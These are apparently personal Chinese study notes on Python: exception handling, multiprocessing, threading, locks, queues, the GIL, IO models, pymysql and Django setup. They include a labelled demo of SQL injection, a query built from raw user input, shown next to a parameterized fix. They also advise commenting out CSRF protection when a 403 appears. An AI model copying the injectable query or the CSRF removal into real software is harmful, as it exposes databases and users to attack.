clangs("C语言中文网","http://c.biancheng.net")
~~~

new方法

~~~python
class demoClass:
    instances_created = 0
    def __new__(cls,*args,**kwargs):
        print("__new__():",cls,args,kwargs)
        instance = super().__new__(cls)
        instance.number = cls.instances_created
        cls.instances_created += 1
        return instance
    def __init__(self,attribute):
        print("__init__():",self,attribute)
        self.attribute = attribute

test1 = demoClass("abc")
test2 = demoClass("xyz")

print(test1.number, test1.instances_created)
print(test2.number, test2.instances_created)
~~~







##### 异常处理

~~~python
# 1、什么是异常
# 异常是程序发生错误的信号，程序一旦出错就会抛出异常，程序的运行随即终止

# 1.1 异常处理的三个特征
# 异常的追踪信息
# 异常的类型
# 异常的内容

# 2、为何处理异常
# 为了增强程序的健壮性，即便是程序运行过程中出错了，也不要终止程序
# 而是捕捉异常并处理：将出错信息记录到日志内

# 3、如何处理异常？
# 3.1 语法上的错误SyntaxError,
# 处理方式一：必须在程序运行前就改正
if 1>3
    print("run...")
  
# 3.2 逻辑上的错误
# 3.2.1 错误发生的条件是可以预知的，使用if判断来解决


# 3.2.2 错误发生的条件是无法预知的

print('start...')
try:
    # 有可能会抛出异常的代码
    子代码1
    子代码2
    子代码3
except 异常类型1 as e:
    pass
except 异常类型2 as e:
    pass
...
else:
    如果被检测的子代码块没有异常发生，则会执行else的子代码
finally:
    无论被检测的子代码块有无异常发生，都会执行finally的子代码

print('end...')

# 用法一：
print('start...')

try:
    print('1111111111')
    l=['aaa','bbbb']
    l[3] # 抛出异常IndexError,该行代码同级别的后续代码不会运行
    print('2222222222')
    xxx
    print('33333333')
    dic={'a':1}
    dic['a']
except IndexError as e:
    print('异常的信息: ',e)

print('end....')

# 用法二：
print('start...')

try:
    print('1111111111')
    l=['aaa','bbbb']
    # l[3] # 抛出异常IndexError,该行代码同级别的后续代码不会运行
    print('2222222222')
    xxx
    print('33333333')
    dic={'a':1}
    dic['a']
except IndexError as e:
    print('异常的信息: ',e)
except NameError as e:
    print('异常的信息: ',e)

print('end....')

# 用法三：
print('start...')

try:
    print('1111111111')
    l = ['aaa', 'bbbb']
    l[3] # 抛出异常IndexError,该行代码同级别的后续代码不会运行
    print('2222222222')
    xxx
    print('33333333')
    dic = {'a': 1}
    dic['aaa']
# except (IndexError, NameError) as e:
#     print('异常的信息: ', e)
# except KeyError as e:
#     print('字典的key不存在: ', e)
except Exception as e:  # 万能异常
    print('所有异常都可以匹配的到')
print('end....')

# 用法四：else不能单独与try配合使用，必须要搭配except
print('start...')

try:
    print('1111111111')
    print('2222222222')
    print('33333333')
except Exception as e:  # 万能异常
    print('所有异常都可以匹配的到')
else:
    print('====>')

print('end....')

# 用法五：finally可以单独与try配合使用
print('start...')

try:
    print('1111111111')
    l = ['aaa', 'bbbb']
    l[3] # 抛出异常IndexError,该行代码同级别的后续代码不会运行
    print('2222222222')
    xxx
    print('33333333')
    dic = {'a': 1}
    dic['aaa']
finally: # 不处理异常，无论是否发生异常都会执行finally的子代码
    print('====》》》》》应该把被检测代码中回收系统资源的代码放到这里')

print('end....')
~~~



#### 多道技术

~~~
并发：看起来像同时执行
并行：就是在同时执行

~并行一定是并发，但并发不一定是并行
~单核的计算机肯定不可能有并行，但是可以实现并发

把文件从硬盘加载到内存，然后CPU执行内存中代码

时间复用 + 空间复用
~~~

~~~
"""
切换(CPU)分为两种情况
	1.当一个程序遇到IO操作的时候，操作系统会剥夺该程序的CPU执行权限
		作用:提高了CPU的利用率 并且也不影响程序的执行效率
	
	2.当一个程序长时间占用CPU的时候，操作吸引也会剥夺该程序的CPU执行权限
		弊端:降低了程序的执行效率(原本时间+切换时间)
"""


~~~

* 先来先服务调度算法

  ```python
  """对长作业有利，对短作业无益"""
  ```

* 短作业优先调度算法

  ```python
  """对短作业有利，多长作业无益"""
  ```

* 时间片轮转法+多级反馈队列

  ~~~
  时间片轮转(Round Robin，RR)法的基本思路是让每个进程在就绪队列中的等待时间与享受服务的时间成比例。在时间片轮转法中，需要将CPU的处理时间分成固定大小的时间片，例如，几十毫秒至几百毫秒。如果一个进程在被调度选中之后用完了系统规定的时间片，但又未完成要求的任务，则它自行释放自己所占有的CPU而排到就绪队列的末尾，等待下一次调度。同时，进程调度程序又去调度当前就绪队列中的第一个进程

![](https://s3.bmp.ovh/imgs/2022/09/13/3f5cea165333edc3.png)

![](https://s3.bmp.ovh/imgs/2022/09/13/c33032801c6b5adc.jpg)

#### 两对重要概念

* **同步和异步**

  ```python
  """描述的是任务的提交方式"""
  同步:任务提交之后，原地等待任务的返回结果，等待的过程中不做任何事(干等)
    	程序层面上表现出来的感觉就是卡住了
  
  异步:任务提交之后，不原地等待任务的返回结果，直接去做其他事情
    	我提交的任务结果如何获取？
      任务的返回结果会有一个异步回调机制自动处理
  ```

​	![同步](https://s3.bmp.ovh/imgs/2022/09/13/f3e7cea0b4757e34.png)



* **阻塞非阻塞**

  ```python
  """描述的程序的运行状态"""
  阻塞:阻塞态
  非阻塞:就绪态、运行态
  
  理想状态:我们应该让我们的写的代码永远处于就绪态和运行态之间切换
  ```

上述概念的组合:最高效的一种组合就是**异步非阻塞**

#### 开启进程的两种方式(异步)

~~~python
# 第一种
from multiprocessing import Process
import time


def task(name):
    print('%s is running'%name)
    time.sleep(3)
    print('%s is over'%name)


if __name__ == '__main__':
    # 1 创建一个对象
    p = Process(target=task, args=('jason',))
    # 容器类型哪怕里面只有1个元素 建议要用逗号隔开
    # 2 开启进程
    p.start()  # 告诉操作系统帮你创建一个进程  异步
    print('主')
"""
windows操作系统下 创建进程一定要在main内创建
因为windows下创建进程类似于模块导入的方式
会从上往下依次执行代码
linux中则是直接将代码完整的拷贝一份
"""

# 第二种方式 类的继承
# from multiprocessing import Process
# import time
#
#
# class MyProcess(Process):
#     def run(self):
#         print('hello bf girl')
#         time.sleep(1)
#         print('get out!')
#
#
# if __name__ == '__main__':
#     p = MyProcess()
#     p.start()
#     print('主')
~~~







~~~python
"""
创建进程就是在内存中申请一块内存空间将需要运行的代码丢进去
一个进程对应在内存中就是一块独立的内存空间
多个进程对应在内存中就是多块独立的内存空间
进程与进程之间数据默认情况下是无法直接交互,如果想交互可以借助于第三方工具、模块
"""
~~~

#### join方法

join是让主进程等待子进程代码运行结束之后，再继续运行。不影响其他子进程的执行

```python
from multiprocessing import Process
import time


def task(name, n):
    print('%s is running'%name)
    time.sleep(n)
    print('%s is over'%name)


if __name__ == '__main__':
    # p1 = Process(target=task, args=('jason', 1))
    # p2 = Process(target=task, args=('egon', 2))
    # p3 = Process(target=task, args=('tank', 3))
    # start_time = time.time()
    # p1.start()
    # p2.start()
    # p3.start()  # 仅仅是告诉操作系统要创建进程
    # # time.sleep(50000000000000000000)
    # # p.join()  # 主进程等待子进程p运行结束之后再继续往后执行
    # p1.join()
    # p2.join()
    # p3.join()
    start_time = time.time()
    p_list = []
    for i in range(1, 4):
        p = Process(target=task, args=('子进程%s'%i, i))
        p.start()
        p_list.append(p)
    for p in p_list:
        p.join()
    print('主', time.time() - start_time)
```

## 



#### 进程之间数据相互隔离

```python
from multiprocessing import Process


money = 100


def task():
    global money  # 局部修改全局
    money = 666
    print('子',money)


if __name__ == '__main__':
    p = Process(target=task)
    p.start()
    p.join()
    print(money)
```



#### 进程对象及其他方法

```python
"""
一台计算机上面运行着很多进程，那么计算机是如何区分并管理这些进程服务端的呢？
计算机会给每一个运行的进程分配一个PID号 
如何查看
	windows电脑 
		进入cmd输入tasklist即可查看
		tasklist |findstr PID查看具体的进程
	mac电脑 
		进入终端之后输入ps aux
		ps aux|grep PID查看具体的进程 
"""
from multiprocessing import Process, current_process
current_process().pid  # 查看当前进程的进程号

import os
os.getpid()  # 查看当前进程进程号
os.getppid()  # 查看当前进程的父进程进程号


p.terminate()  # 杀死当前进程
# 是告诉操作系统帮你去杀死当前进程 但是需要一定的时间 而代码的运行速度极快
time.sleep(0.1)
print(p.is_alive())  # 判断当前进程是否存活
```

#### 僵尸进程与孤儿进程

```python
# 僵尸进程
"""
死了但是没有死透
当你开设了子进程之后 该进程死后不会立刻释放占用的进程号
因为我要让父进程能够查看到它开设的子进程的一些基本信息 占用的pid号 运行时间。。。
所有的进程都会步入僵尸进程
	父进程不死并且在无限制的创建子进程并且子进程也不结束
	回收子进程占用的pid号
		父进程等待子进程运行结束
		父进程调用join方法
"""

# 孤儿进程
"""
子进程存活，父进程意外死亡
操作系统会开设一个“儿童福利院”专门管理孤儿进程回收相关资源
"""
```

#### 守护进程

```PYTHON
from multiprocessing import Process
import time


def task(name):
    print('%s总管正在活着'% name)
    time.sleep(3)
    print('%s总管正在死亡' % name)


if __name__ == '__main__':
    p = Process(target=task,args=('egon',))
    # p = Process(target=task,kwargs={'name':'egon'})
    p.daemon = True  # 将进程p设置成守护进程  这一句一定要放在start方法上面才有效否则会直接报错
    p.start()
    print('皇帝jason寿终正寝')
```

#### 互斥锁

多个进程操作同一份数据的时候，会出现数据错乱的问题

针对上述问题，解决方式就是加锁处理:**将并发变成串行，牺牲效率但是保证了数据的安全**

```python
from multiprocessing import Process, Lock
import json
import time
import random


# 查票
def search(i):
    # 文件操作读取票数
    with open('data','r',encoding='utf8') as f:
        dic = json.load(f)
    print('用户%s查询余票：%s'%(i, dic.get('ticket_num')))
    # 字典取值不要用[]的形式 推荐使用get  你写的代码打死都不能报错！！！


# 买票  1.先查 2.再买
def buy(i):
    # 先查票
    with open('data','r',encoding='utf8') as f:
        dic = json.load(f)
    # 模拟网络延迟
    time.sleep(random.randint(1,3))
    # 判断当前是否有票
    if dic.get('ticket_num') > 0:
        # 修改数据库 买票
        dic['ticket_num'] -= 1
        # 写入数据库
        with open('data','w',encoding='utf8') as f:
            json.dump(dic,f)
        print('用户%s买票成功'%i)
    else:
        print('用户%s买票失败'%i)


# 整合上面两个函数
def run(i, mutex):
    search(i)
    # 给买票环节加锁处理
    # 抢锁
    mutex.acquire()

    buy(i)
    # 释放锁
    mutex.release()


if __name__ == '__main__':
    # 在主进程中生成一把锁 让所有的子进程抢 谁先抢到谁先买票
    mutex = Lock()
    for i in range(1,11):
        p = Process(target=run, args=(i, mutex))
        p.start()
"""
扩展 行锁 表锁

注意：
	1.锁不要轻易的使用，容易造成死锁现象(我们写代码一般不会用到，都是内部封装好的)
	2.锁只在处理数据的部分加来保证数据安全(只在争抢数据的环节加锁处理即可) 
"""
```

#### 进程间通信

#### 队列Queue模块

```python
"""
管道:subprocess 
	stdin stdout stderr
队列:管道+锁

队列:先进先出
堆栈:先进后出
"""
from multiprocessing import Queue

# 创建一个队列
q = Queue(5)  # 括号内可以传数字 标示生成的队列最大可以同时存放的数据量

# 往队列中存数据
q.put(111)
q.put(222)
q.put(333)
# print(q.full())  # 判断当前队列是否满了
# print(q.empty())  # 判断当前队列是否空了
q.put(444)
q.put(555)
# print(q.full())  # 判断当前队列是否满了

# q.put(666)  # 当队列数据放满了之后 如果还有数据要放程序会阻塞 直到有位置让出来 不会报错

"""
存取数据 存是为了更好的取
千方百计的存、简单快捷的取

同在一个屋檐下
差距为何那么大
"""

# 去队列中取数据
v1 = q.get()
v2 = q.get()
v3 = q.get()
v4 = q.get()
v5 = q.get()
# print(q.empty())
# V6 = q.get_nowait()  # 没有数据直接报错queue.Empty
# v6 = q.get(timeout=3)  # 没有数据之后原地等待三秒之后再报错  queue.Empty
try:
    v6 = q.get(timeout=3)
    print(v6)
except Exception as e:
    print('一滴都没有了!')

# # v6 = q.get()  # 队列中如果已经没有数据的话 get方法会原地阻塞
# print(v1, v2, v3, v4, v5, v6)

"""
q.full()
q.empty()
q.get_nowait()
在多进程的情况下是不精确
"""
```

![image-20220913200327605](C:\Users\batma\AppData\Roaming\Typora\typora-user-images\image-20220913200327605.png)

#### IPC机制-消息队列

```python
from multiprocessing import Queue, Process

"""
研究思路
    1.主进程跟子进程借助于队列通信
    2.子进程跟子进程借助于队列通信
"""
def producer(q):
    q.put('我是23号技师 很高兴为您服务')


def consumer(q):
    print(q.get())


if __name__ == '__main__':
    q = Queue()
    p = Process(target=producer,args=(q,))
    p1 = Process(target=consumer,args=(q,))
    p.start()
    p1.start()
```

#### 生产者消费者模型

~~~python
from multiprocessing import Process, Queue, JoinableQueue
import time
import random


def producer(name,food,q):
    for i in range(5):
        data = '%s生产了%s%s'%(name,food,i)
        # 模拟延迟
        time.sleep(random.randint(1,3))
        print(data)
        # 将数据放入 队列中
        q.put(data)


def consumer(name,q):
    # 消费者胃口很大 光盘行动
    while True:
        food = q.get()  # 没有数据就会卡住
        # 判断当前是否有结束的标识
        # if food is None:break
        time.sleep(random.randint(1,3))
        print('%s吃了%s'%(name,food))
        q.task_done()  # 告诉队列你已经从里面取出了一个数据并且处理完毕了


if __name__ == '__main__':
    # q = Queue()
    q = JoinableQueue()
    p1 = Process(target=producer,args=('大厨egon','包子',q))
    p2 = Process(target=producer,args=('马叉虫tank','泔水',q))
    c1 = Process(target=consumer,args=('春哥',q))
    c2 = Process(target=consumer,args=('新哥',q))
    p1.start()
    p2.start()
    # 将消费者设置成守护进程
    c1.daemon = True
    c2.daemon = True
    c1.start()
    c2.start()
    p1.join()
    p2.join()
    # 等待生产者生产完毕之后 往队列中添加特定的结束符号
    # q.put(None)  # 肯定在所有生产者生产的数据的末尾
    # q.put(None)  # 肯定在所有生产者生产的数据的末尾
    q.join()  # 等待队列中所有的数据被取完再执行往下执行代码
    """
    JoinableQueue 每当你往该队列中存入数据的时候 内部会有一个计数器+1
    没当你调用task_done的时候 计数器-1
    q.join() 当计数器为0的时候 才往后运行
    """
    # 只要q.join执行完毕 说明消费者已经处理完数据了  消费者就没有存在的必要了
~~~



#### 线程

~~~python
	进程:资源单位(起一个进程仅仅只是在内存空间中开辟一块独立的空间)
	线程:执行单位(真正被cpu执行的其实是进程里面的线程，线程指的就是代码的执行过程，执行代码中所需要使用到的资源都找所在的进程索要)
	
一个进程内可以开设多个线程，在用一个进程内开设多个线程无需再次申请内存空间操作
每一个进程肯定自带一个线程


~~~

![image-20220916112858678](C:\Users\batma\AppData\Roaming\Typora\typora-user-images\image-20220916112858678.png)





#### 开启线程的两种方式

~~~
# from multiprocessing import Process
# from threading import Thread
# import time
#
#
# def task(name):
#     print('%s is running'%name)
#     time.sleep(1)
#     print('%s is over'%name)
#
#
# # 开启线程不需要在main下面执行代码 直接书写就可以
# # 但是我们还是习惯性的将启动命令写在main下面
# t = Thread(target=task,args=('egon',))
# # p = Process(target=task,args=('jason',))
# # p.start()
# t.start()  # 创建线程的开销非常小 几乎是代码一执行线程就已经创建了
# print('主')



from threading import Thread
import time


class MyThead(Thread):
    def __init__(self, name):
        """针对刷个下划线开头双下滑线结尾(__init__)的方法 统一读成 双下init"""
        # 重写了别人的方法 又不知道别人的方法里有啥 你就调用父类的方法
        super().__init__()
        self.name = name

    def run(self):
        print('%s is running'%self.name)
        time.sleep(1)
        print('egon DSB')


if __name__ == '__main__':
    t = MyThead('egon')
    t.start()
    print('主')
~~~

#### TCP服务端实现并发的效果

```python
import socket
from threading import Thread
from multiprocessing import Process
"""
服务端
    1.要有固定的IP和PORT
    2.24小时不间断提供服务
    3.能够支持并发
    
从现在开始要养成一个看源码的习惯
我们前期要立志称为拷贝忍者 卡卡西 不需要有任何的创新
等你拷贝到一定程度了 就可以开发自己的思想了
"""
server =socket.socket()  # 括号内不加参数默认就是TCP协议
server.bind(('127.0.0.1',8080))
server.listen(5)


# 将服务的代码单独封装成一个函数
def talk(conn):
    # 通信循环
    while True:
        try:
            data = conn.recv(1024)
            # 针对mac linux 客户端断开链接后
            if len(data) == 0: break
            print(data.decode('utf-8'))
            conn.send(data.upper())
        except ConnectionResetError as e:
            print(e)
            break
    conn.close()

# 链接循环
while True:
    conn, addr = server.accept()  # 接客
    # 叫其他人来服务客户
    # t = Thread(target=talk,args=(conn,))
    t = Process(target=talk,args=(conn,))
    t.start()


"""客户端"""
import socket


client = socket.socket()
client.connect(('127.0.0.1',8080))

while True:
    client.send(b'hello world')
    data = client.recv(1024)
    print(data.decode('utf-8'))
```

#### 线程对象的join方法

```python
from threading import Thread
import time


def task(name):
    print('%s is running'%name)
    time.sleep(3)
    print('%s is over'%name)


if __name__ == '__main__':
    t = Thread(target=task,args=('egon',))
    t.start()
    t.join()  # 主线程等待子线程运行结束再执行
    print('主')
```

#### 同一个进程下的多个线程数据是共享的

```python
from threading import Thread
import time


money = 100


def task():
    global money
    money = 666
    print(money)


if __name__ == '__main__':
    t = Thread(target=task)
    t.start()
    t.join()
    print(money)
```

#### 线程对象属性及其他方法

```python
from threading import Thread, active_count, current_thread
import os,time


def task(n):
    # print('hello world',os.getpid())
    print('hello world',current_thread().name)
    time.sleep(n)


if __name__ == '__main__':
    t = Thread(target=task,args=(1,))
    t1 = Thread(target=task,args=(2,))
    t.start()
    t1.start()
    t.join()
    print('主',active_count())  # 统计当前正在活跃的线程数
    # print('主',os.getpid())
    # print('主',current_thread().name)  # 获取线程名字
```

#### 守护线程

```python
# from threading import Thread
# import time
#
#
# def task(name):
#     print('%s is running'%name)
#     time.sleep(1)
#     print('%s is over'%name)
#
#
# if __name__ == '__main__':
#     t = Thread(target=task,args=('egon',))
#     t.daemon = True
#     t.start()
#     print('主')

"""
主线程运行结束之后不会立刻结束 会等待所有其他非守护线程结束才会结束
    因为主线程的结束意味着所在的进程的结束
"""


# 稍微有一点迷惑性的例子
from threading import Thread
import time


def foo():
    print(123)
    time.sleep(1)
    print('end123')


def func():
    print(456)
    time.sleep(3)
    print('end456')


if __name__ == '__main__':
    t1 = Thread(target=foo)
    t2 = Thread(target=func)
    t1.daemon = True
    t1.start()
    t2.start()
    print('主.......')
```

#### 线程互斥锁

```python
from threading import Thread,Lock
import time


money = 100
mutex = Lock()


def task():
    global money
    mutex.acquire()
    tmp = money
    time.sleep(0.1)
    money = tmp - 1
    mutex.release()


if __name__ == '__main__':

    t_list = []
    for i in range(100):
        t = Thread(target=task)
        t.start()
        t_list.append(t)
    for t in t_list:
        t.join()
    print(money)
```

#### GIL全局解释器锁

~~~
python解释器其实有多个版本
	Cpython
	Jpython
	Pypypython
但是普遍使用的都是CPython解释器

在CPython解释器中GIL是一把互斥锁，用来阻止同一个进程下的多个线程的同时执行
	同一个进程下的多个线程无法利用多核优势！！！
	疑问:python的多线程是不是一点用都没有？？？无法利用多核优势
	
因为cpython中的内存管理不是线程安全的
内存管理(垃圾回收机制)
	1.应用计数
	2.标记清楚
	3.分代回收

重点:
	1.GIL不是python的特点而是CPython解释器的特点
	2.GIL是保证解释器级别的数据的安全
	3.GIL会导致同一个进程下的多个线程的无法同时执行即无法利用多核优势(******)
	4.针对不同的数据还是需要加不同的锁处理 
	5.解释型语言的通病:同一个进程下多个线程无法利用多核优势
~~~

![](https://s3.bmp.ovh/imgs/2022/09/22/f95923602ec3ee99.jpg)

![](https://s3.bmp.ovh/imgs/2022/09/22/7d7377018ca0243c.png)

~~~python
"""
多线程是否有用要看具体情况
单核:四个任务(IO密集型\计算密集型)
多核:四个任务(IO密集型\计算密集型)
"""
# 计算密集型   每个任务都需要10s
单核(不用考虑了)
	多进程:额外的消耗资源
  多线程:介绍开销
多核
	多进程:总耗时 10+
  多线程:总耗时 40+
# IO密集型  
多核
	多进程:相对浪费资源
  多线程:更加节省资源
~~~



~~~python
# 计算密集型
# from multiprocessing import Process
# from threading import Thread
# import os,time
#
#
# def work():
#     res = 0
#     for i in range(10000000):
#         res *= i
#
# if __name__ == '__main__':
#     l = []
#     print(os.cpu_count())  # 获取当前计算机CPU个数
#     start_time = time.time()
#     for i in range(12):
#         p = Process(target=work)  # 1.4679949283599854
#         t = Thread(target=work)  # 5.698534250259399
#         t.start()
#         # p.start()
#         # l.append(p)
#         l.append(t)
#     for p in l:
#         p.join()
#     print(time.time()-start_time)



# IO密集型
from multiprocessing import Process
from threading import Thread
import os,time


def work():
    time.sleep(2)

if __name__ == '__main__':
    l = []
    print(os.cpu_count())  # 获取当前计算机CPU个数
    start_time = time.time()
    for i in range(4000):
        # p = Process(target=work)  # 21.149890184402466
        t = Thread(target=work)  # 3.007986068725586
        t.start()
        # p.start()
        # l.append(p)
        l.append(t)
    for p in l:
        p.join()
    print(time.time()-start_time)
~~~

#### 网络IO模型

#### 1）阻塞IO

![image.png](https://cdnjson.com/images/2023/05/28/image.png)

例如我们之前编写的小远控

#### 2）非阻塞IO

尽可能的抓住CPU

![imagea3ca7262331f2262.png](https://cdnjson.com/images/2023/05/28/imagea3ca7262331f2262.png)

~~~python
"""
要自己实现一个非阻塞IO模型
"""
import socket
import time


server = socket.socket()
server.bind(('127.0.0.1', 8081))
server.listen(5)
server.setblocking(False)
# 将所有的网络阻塞变为非阻塞
r_list = []
del_list = []
while True:
    try:
        conn, addr = server.accept()
        r_list.append(conn)
    except BlockingIOError:
        # time.sleep(0.1)
        # print('列表的长度:',len(r_list))
        # print('做其他事')
        for conn in r_list:
            try:
                data = conn.recv(1024)  # 没有消息 报错
                if len(data) == 0:  # 客户端断开链接
                    conn.close()  # 关闭conn
                    # 将无用的conn从r_list删除
                    del_list.append(conn)
                    continue
                conn.send(data.upper())
            except BlockingIOError:
                continue
            except ConnectionResetError:
                conn.close()
                del_list.append(conn)
        # 挥手无用的链接
        for conn in del_list:
            r_list.remove(conn)
        del_list.clear()

# 客户端
import socket


client = socket.socket()
client.connect(('127.0.0.1',8081))


while True:
    client.send(b'hello world')
    data = client.recv(1024)
    print(data)
~~~



#### 3）IO多路复用

优点就是可以一次性监管很多个对象，IO多路复用比阻塞IO在编写远控软件上的优势

~~~python
"""
当监管的对象只有一个的时候 其实IO多路复用连阻塞IO都比比不上！！！
但是IO多路复用可以一次性监管很多个对象

server = socket.socket()
conn,addr = server.accept()

监管机制是操作系统本身就有的 如果你想要用该监管机制(select)
需要你导入对应的select模块
"""
import socket
import select


server = socket.socket()
server.bind(('127.0.0.1',8080))
server.listen(5)
server.setblocking(False)
read_list = [server]


while True:
    r_list, w_list, x_list = select.select(read_list, [], [])
    """
    帮你监管
    一旦有人来了 立刻给你返回对应的监管对象
    """
    # print(res)  # ([<socket.socket fd=3, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=('127.0.0.1', 8080)>], [], [])
    # print(server)
    # print(r_list)
    for i in r_list:  #
        """针对不同的对象做不同的处理"""
        if i is server:
            conn, addr = i.accept()
            # 也应该添加到监管的队列中
            read_list.append(conn)
        else:
            res = i.recv(1024)
            if len(res) == 0:
                i.close()
                # 将无效的监管对象 移除
                read_list.remove(i)
                continue
            print(res)
            i.send(b'heiheiheiheihei')

 # 客户端
import socket


client = socket.socket()
client.connect(('127.0.0.1',8080))


while True:

    client.send(b'hello world')
    data = client.recv(1024)
    print(data)
~~~

![image9c3697e4fc8ef90e.png](https://cdnjson.com/images/2023/05/28/image9c3697e4fc8ef90e.png)

~~~python
"""
监管机制其实有很多
select机制  windows linux都有

poll机制    只在linux有   poll和select都可以监管多个对象 但是poll监管的数量更多

上述select和poll机制其实都不是很完美 当监管的对象特别多的时候
可能会出现 极其大的延时响应

epoll机制   只在linux有
	它给每一个监管对象都绑定一个回调机制
	一旦有响应 回调机制立刻发起提醒

针对不同的操作系统还需要考虑不同检测机制 书写代码太多繁琐
有一个人能够根据你跑的平台的不同自动帮你选择对应的监管机制
selectors模块
"""
~~~

#### 4）异步IO

~~~python
"""
异步IO模型是所有模型中效率最高的 也是使用最广泛的
相关的模块和框架
	模块:asyncio模块
	异步框架:sanic tronado twisted
		速度快！！！
"""
import threading
import asyncio


@asyncio.coroutine
def hello():
    print('hello world %s'%threading.current_thread())
    yield from asyncio.sleep(1)  # 换成真正的IO操作
    print('hello world %s' % threading.current_thread())


loop = asyncio.get_event_loop()
tasks = [hello(),hello()]
loop.run_until_complete(asyncio.wait(tasks))
loop.close()
~~~

对比

![imaged20730ecaa5935e9.png](https://cdnjson.com/images/2023/05/28/imaged20730ecaa5935e9.png)



#### 总结

~~~python
多进程和多线程都有各自的优势
并且我们后面在写项目的时候通常可以
	多进程下面再开设多线程
这样的话既可以利用多核也可以介绍资源消耗
~~~





#### pymysql

~~~
pip3 install pymysql -i https://pypi.douban.com/simple/
~~~

~~~python
import pymysql


conn = pymysql.connect(
    host = '127.0.0.1',
    port = 3306,
    user = 'root',
    password = 'root',
    database = 'student1',
    charset = 'utf8'  # 编码千万不要加-
)  # 链接数据库
cursor = conn.cursor(cursor=pymysql.cursors.DictCursor)  # 产生一个游标对象(就是用来帮你执行命令的)
"""
cursor=pymysql.cursors.DictCursor将查询结果以字典的形式返回
"""
sql = 'select * from teacher;'
res = cursor.execute(sql)
# print(res)  # execute返回的是你当前sql语句所影响的行数  改返回值一般不用
# 获取命令执行的查询结果
# print(cursor.fetchone())  # 只拿一条
# print(cursor.fetchall())  # 拿所有
# print(cursor.fetchmany(2))  # 可以指定拿几条
print(cursor.fetchone())
print(cursor.fetchone())  # 读取数据类似于文件光标的移动
# cursor.scroll(1,'relative')  # 相对于光标所在的位置继续往后移动1位
cursor.scroll(1,'absolute')  # 相对于数据的开头往后继续移动1位
print(cursor.fetchall())
~~~

存在SQL注入的demo代码

~~~python
import pymysql

conn = pymysql.connect(host='127.0.0.1', user='root',password='root', port=3306, charset='utf8', database='student1')
print(conn)
cursor = conn.cursor(cursor=pymysql.cursors.DictCursor) # 产生一个游标对象   且以字典的方式返回
id = input("请输入查找的用户id: ")
sql = f"select * from ty_user where id='{id}';"
res = cursor.execute(sql)
print(res) # 返回的行数
res2 = cursor.fetchone()
print(res2)
print(type(res2))
~~~

[![p9lMSUO.png](https://s1.ax1x.com/2023/04/28/p9lMSUO.png)](https://imgse.com/i/p9lMSUO)

加上预编译之后

~~~python
import pymysql

conn = pymysql.connect(host='127.0.0.1', user='root',password='root', port=3306, charset='utf8', database='student1')

print(conn)

cursor = conn.cursor() # 产生一个游标对象
id = input("请输入查找的用户id: ")
sql = "select * from ty_user where id=%s;"
res = cursor.execute(sql, (id,))
res2 = cursor.fetchone()
print(res2)
~~~

[![p9lMi2d.png](https://s1.ax1x.com/2023/04/28/p9lMi2d.png)](https://imgse.com/i/p9lMi2d)

##### jinja2

~~~python
pip3 install jinja2
"""模版语法是在后端起作用的"""

# 模版语法(非常贴近python语法)
{[ user ]}
{[ user.get('username')]}
{[ user.age ]}
{[ user['hobby'] ]}


{# for user_dict in user_list #}
                        <tr>
                            <td>{[ user_dict.id]}</td>
                            <td>{[ user_dict.username]}</td>
                            <td>{[ user_dict.password]}</td>
                            <td>{[ user_dict.hobby]}</td>
                        </tr>
{# endfor#}
~~~

#### 命令行与pycharm创建的区别

```python
# 1 命令行创建不会自动有templatew文件夹 需要你自己手动创建而pycharm会自动帮你创建并且还会自动在配置文件中配置对应的路径
# pycharm创建
TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [os.path.join(BASE_DIR, 'templates')]
]
# 命令行创建
TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [],
]
"""
也就意味着你在用命令创建django项目的时候不单单需要创建templates文件夹还需要去配置文件中配置路径
'DIRS': [os.path.join(BASE_DIR, 'templates')]
"""
```

#### django小白必会三板斧

```python
"""
HttpResponse
	返回字符串类型的数据

render
	返回html文件的

redirect
	重定向
	  return redirect('https://www.mzitu.com/')
    return redirect('/home/')
"""
```

#### django

~~~python
#	安装django
pip3 install django
#	验证是否存在
django-admin
#	创建项目
django-admin startproject mysite
~~~

[![p9l1dJS.png](https://s1.ax1x.com/2023/04/28/p9l1dJS.png)](https://imgse.com/i/p9l1dJS)

~~~python
#	启动项目，切到对应目录下
python manage.py runserver
#	http://127.0.0.1:8000/
python manage.py startapp app01

~~~

~~~python
-mysite项目文件夹
	--mysite文件夹
  	---settings.py	配置文件
    ---urls.py			路由与视图函数对应关系(路由层)
    ---wsgi.py			wsgiref模块(不考虑)
  --manage.py				django的入口文件
  --db.sqlite3			django自带的sqlite3数据库(小型数据库 功能不是很多还有bug)
  --app01文件夹
  	---admin.py			django后台管理
    ---apps.py			注册使用
    ---migrations文件夹		数据库迁移记录
    ---models.py		数据库相关的 模型类(orm)
  	---tests.py			测试文件
    ---views.py			视图函数(视图层)
~~~





##### 添加功能

[![p9lrmdO.png](https://s1.ax1x.com/2023/04/28/p9lrmdO.png)](https://imgse.com/i/p9lrmdO)

访问这个localhost:8000/index时会自动render渲染到myfirst.html

[![p9lrnoD.png](https://s1.ax1x.com/2023/04/28/p9lrnoD.png)](https://imgse.com/i/p9lrnoD)

[![p9lrQWd.png](https://s1.ax1x.com/2023/04/28/p9lrQWd.png)](https://imgse.com/i/p9lrQWd)

.

在settings里面必须加入这段

~~~python
STATIC_URL = 'static/'
#   静态文件配置
STATICFILES_DIRS = [
    os.path.join(BASE_DIR, 'static')
]
~~~

在views.py里，我的login方法那里，如果提交查询，那么点击提交查询后

[![p9lfem9.png](https://s1.ax1x.com/2023/04/28/p9lfem9.png)](https://imgse.com/i/p9lfem9)

[![p9lfKFx.png](https://s1.ax1x.com/2023/04/28/p9lfKFx.png)](https://imgse.com/i/p9lfKFx)

我们就需要设置将post到login方法的内容进行数据库查询

另外就是如果提交之后是403，则csrf那里必须注释掉

[![p93RWVA.png](https://s1.ax1x.com/2023/04/30/p93RWVA.png)](https://imgse.com/i/p93RWVA)

#### django链接数据库(MySQL)

~~~python
# 默认用的是sqkite3
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3',
        'NAME': os.path.join(BASE_DIR, 'db.sqlite3'),
    }
}

# django链接MySQL
	1.第一步配置文件中配置
  	DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': 'day60',
        'USER':'root',
        'PASSWORD':'admin123',
        'HOST':'127.0.0.1',
        'PORT':3306,
        'CHARSET':'utf8'
